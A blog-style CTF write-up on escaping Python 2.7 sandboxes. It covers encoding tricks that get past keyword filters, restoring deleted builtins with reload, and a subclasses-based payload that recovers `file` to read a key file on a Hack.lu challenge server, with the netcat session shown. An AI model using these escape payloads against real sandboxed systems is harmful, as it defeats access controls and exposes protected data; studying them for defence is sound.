---
title: "Escaping Python Sandboxes"
date: 2012-10-26T23:14:27-04:00
draft: false
---

*This was originally published on the [OSIRIS blog](https://blog.osiris.cyber.nyu.edu/ctf/exploitation%20techniques/2012/10/26/escaping-python-sandboxes/)*

*Note: This is all written for Python 2.7.3. These details might be different in other versions of Python - especially 3+!*

Attempting to escape a sandbox is always a fun challenge. Python sandboxes are no exception. In a static language, this is usually done by analyzing the code to see if certain functions are called, or wrapping the dangerous functions with code that does validation. However, this is a bit more challenging in dynamic languages like Python.

A simple approach to sandboxing is to scan the contents of the script for certain keywords or functions that are dangerous, like eval, exec, execfile, and import. That can easily be bypassed by encoding your script. [PEP-0263](http://www.python.org/dev/peps/pep-0263/) goes into the details, but as long as you have `# coding:<encoding>` on one of the first two lines in the script, the Python interpreter will interpret that entire script with that encoding.

```
# coding: rot_13
# "import evil_module" encoded in ROT13
'vzcbeg rivy_zbqhyr'
```

Obviously, a better method is needed. But before we go into that, some background:

`dir` is your first tool for examining python objects. To quote the docs:
> Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that object.*"

It doesn't claim to be complete, and it's possible for a class to define a `__dir__` method, but for now we can assume it will be accurate.

The second function I often use is `type`. Simply enough, with a single parameter, it gives you the type of an object - this can be useful for understanding what something is, once you know about it's existence. Again, to refer to the docs:
> Return the type of an object. The return value is a type object.

So now let's start poking.

When execution begins, the following objects are in the local scope (yay dir()!):

```python
>>> dir()
['__builtins__', '__doc__', '__name__', '__package__']
```

From these, `__builtins__` is most interesting.

```
>>> type(__builtins__)
<type 'module'>
```

Hmm, let's see the Python language reference:
> A module object has a namespace implemented by a dictionary object … Attribute references are translated to lookups in this dictionary, e.g., `m.x` is equivalent to `m.__dict__["x"]`

Now, we can examine the builtins simply by running `dir(__builtins__)` That list is a little long. The entries are all of the builtin types and functions.

So now let's revisit the previous string-checking method for sandboxing. Perhaps you don't have the ability to change the encoding for the entire file. You can still encode the name of a single function call by accessing the module's underlying dict, and then using a variable to access the needed function. So let's call `import os` in a slightly sneakier way, using the builtin function `__import__`: First get the base64 version of the strings `"__import__"` and `"os"`:

```
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
```


Putting it together:

```python
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
<module 'os' from '/usr/lib/python2.7/os.pyc'>
```

Hmm, so using text filtering to sandbox code is clearly out.

Perhaps we can take another approach at filtering, based on using `__builtins__.__dict__`. Since `__builtins__.__dict__` is a dictionary that represents all of the builtin functions available to our environment, if we modify one of those entries we can change what's available for the environment.

For example, the `abs` function returns the absolute value of a number:

```python
>>> abs(-1)
1
```

Now, let's play with it a bit:

```python
>>> __builtins__.__dict__['abs'] = None
>>> abs(-1)
Traceback (most recent call last):
File "<stdin>", line 1, in <module>
TypeError: 'NoneType' object is not callable
```


The `del` statement deletes a reference to an object:

```python
>>> del __builtins__.__dict__['abs']
>>> abs(-1)
Traceback (most recent call last):
File "<stdin>", line 1, in <module>
NameError: name 'abs' is not defined
```

We just removed the ability for the environment to call `abs`! So now we have another approach to Python sandboxing - remove access to many 'dangerous' builtins.

Let's make a small list of dangerous functions:

```python
>>> del __builtins__.__dict__['__import__'] # __import__ is the function called by the import statement
>>> del __builtins__.__dict__['eval'] # evaluating code could be dangerous
>>> del __builtins__.__dict__['execfile'] # likewise for executing the contents of a file
>>> del __builtins__.__dict__['input'] # Getting user input and evaluating it might be dangerous
```

Hmm, this looks a bit safer, right?

```python
>>> import os
Traceback (most recent call last):
File "<stdin>", line 1, in <module>
ImportError: __import__ not found
```


Oh wait!

`reload(module)` reloads an imported module, and executes the code - so the module gets imported back into our namespace.

```
>>> reload(__builtins__)
>>> import os
>>> dir(os)
```


I guess we'll have to add that to the list.

```
>>> del __builtins__.__dict__['reload'] # they might reload __builtins__ !
```

OK. So now we have a safe approach, right? We prevented anyone in our sandbox from using a dangerous builtin, and we can prevent them from using the `eval` keyword by not allowing them to encode the entire file and scanning the contents. Hopefully we removed all of the dangerous builtins…

Let's take a challenge from [Hack.lu's CTF](http://2012.hack.lu/index.php/CaptureTheFlag). In their challenge, you need to read the contents of a file, './key'.

They first destroy the builtin functions for opening a file by deleting the references. Then they allow you to execute user input. Take a look at a slightly-modified version of their code:

```python
def make_secure():
    UNSAFE = ['open',
              'file',
              'execfile',
              'compile',
              'reload',
              '__import__',
              'eval',
              'input']
    for func in UNSAFE:
        del __builtins__.__dict__[func]

from re import findall
# Remove dangerous builtins
make_secure()
print 'Go Ahead, Expoit me >;D'

while True:
    try:
        # Read user input until the first whitespace character
        inp = findall('\S+', raw_input())[0]
        a = None
        # Set a to the result from executing the user input
        exec 'a=' + inp
        print 'Return Value:', a
    except Exception, e:
	print 'Exception:', e
```


Encoding tricks won't work - we don't have a reference to `file` or `open` in the `__builtins__`. But perhaps we can dig up a reference to `file` or `open` from another location in the interpreter and use that instead?

Let's dig a bit.

(For this section I need to give credit to [Ned Batchelder](http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html). I was reading his blog this past summer, and he has a nice writeup about how `eval` is an extremely dangerous statement, and he goes through this method in his code.)

As mentioned earlier, running `type` on an object returns a `type object`. For example:

```python
>>> type( [1,2,3] )
<type 'list'>
```

Now, let's start examining the fields of a tuple:

```python
>>> dir( () )
['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'count', 'index']
```

Most of these are functions. But `__class__` is a bit interesting. It returns the class representing the object.

```python
>>> type(().__class__)
<type 'type'>
```

This gets into metaclass and metatype details. That's all in [PEP 0253](http://www.python.org/dev/peps/pep-0253/). Let's ignore that for now and dig a bit deeper.

According to the [docs](http://docs.python.org/library/stdtypes.html#special-attributes), new-style classes have some special attributes. Specifically, `__bases__`, which contains “the base classes, in the order of their occurrence in the base class list" and `class.__subclasses__()`, which returns a list of all of the subclasses.

Let's examine our tuple.

```python
>>> ().__class__.__bases__
(<type 'object'>,)
```


It inherits directly from object. I wonder what else does:

```python
>>> ().__class__.__bases__[0].__subclasses__()
[<type 'weakproxy'>, <type 'int'>, <type 'basestring'>,
<type 'bytearray'>, <type 'list'>, <type 'NoneType'>,
<type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>,
<type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>,
<type 'staticmethod'>, <type 'complex'>, <type 'float'>,
<type 'buffer'>, <type 'long'>, <type 'frozenset'>,
<type 'property'>, <type 'memoryview'>, <type 'tuple'>,
<type 'enumerate'>, <type 'reversed'>, <type 'code'>,
<type 'frame'>, <type 'builtin_function_or_method'>,
<type 'instancemethod'>, <type 'function'>, <type 'classobj'>,
<type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>,
<type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>,
<type 'member_descriptor'>, <type 'file'>, <type 'sys.long_info'>,
... and more!
```


We have everything we need right here!

Then I was able to find the index of `file` in the list with a few simple lines:

```python
>>> all_classes = []
>>> for entry in ().__class__.__bases__[0].__subclasses__():
...     all_classes.append(entry.__name__)
...
>>> all_classes.index("file")
40
```

We can't use this code (even rewritten as a list comprehension) in the challenge, because it includes whitespace. But since `file` is at index 40, we can hard-code that.

```python
>>> ().__class__.__bases__[0].__subclasses__()[40]
<type 'file'>
```

Once we have a reference to the file, all we need to do is create a file object and read it:

```python
>> ().__class__.__bases__[0].__subclasses__()[40]("./key").read()
"This works"
```

So to solve the challenge:

```bash
moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045
Go Ahead, Expoit me >;D
().__class__.__bases__[0].__subclasses__()[40]("./key").read()
().__class__.__bases__[0].__subclasses__()[40]("./key").read()
Return Value: FvibLF0eBkCBk
```

On a side note, we didn't need to do it in a single statement - `exec` runs code in the current context, so we could just as easily maintain state across commands by storing the output of each command in a variable (besides `a`).

```bash
moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045
Go Ahead, Expoit me >;D
x=23
x=23
Return Value: 23
45
45
Return Value: 45
x
x
Return Value: 23
```

Further Reading:

- Another bit of magic that could be useful: <http://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/c1v372r>
- Ned Batchelder's blog post: <http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html>


